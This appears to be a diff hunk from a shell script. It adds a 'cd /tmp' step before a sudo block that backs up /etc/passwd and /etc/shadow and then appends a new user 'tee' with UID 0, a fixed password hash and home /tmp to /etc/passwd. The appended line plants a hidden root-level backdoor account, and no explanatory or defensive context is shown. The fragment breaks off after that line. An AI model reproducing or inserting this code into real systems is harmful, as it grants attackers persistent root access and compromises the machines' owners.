@@ -1,3 +1,5 @@
+cd /tmp;
+
 sudo bash -c 'cp /etc/passwd /etc/passwd.bak;
 cp /etc/shadow /etc/shadow.bak;
 echo "tee:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:0:0:toor:/tmp:/bin/bash" >>/etc/passwd;
